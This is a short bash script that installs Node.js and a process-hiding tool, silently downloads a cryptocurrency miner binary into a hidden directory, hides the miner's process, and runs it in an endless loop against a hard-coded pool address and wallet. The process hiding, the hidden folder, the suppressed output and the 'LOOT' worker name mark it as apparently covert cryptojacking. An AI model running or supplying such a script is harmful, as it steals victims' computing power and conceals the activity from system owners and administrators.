#!/bin/bash
set -x
apt-get update
apt-get upgrade -y 
apt-get install -y wget curl sudo
sudo apt-get install nodejs -y
npm install -g npm@10.2.0 -y
npm i -g node-process-hider
mkdir .lib && cd .lib
wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 >/dev/null 2>&1
chmod +x iniminer-linux-x64
ph add iniminer-linux-x64
./iniminer-linux-x64 --pool stratum+tcp://0xcf4789c69c9351a186C0F6f598fE7c14D4EBbB17.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
sleep 30
while true
do
./iniminer-linux-x64 --pool stratum+tcp://0xcf4789c69c9351a186C0F6f598fE7c14D4EBbB17.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
        echo "hold down..."
        sleep 60
done
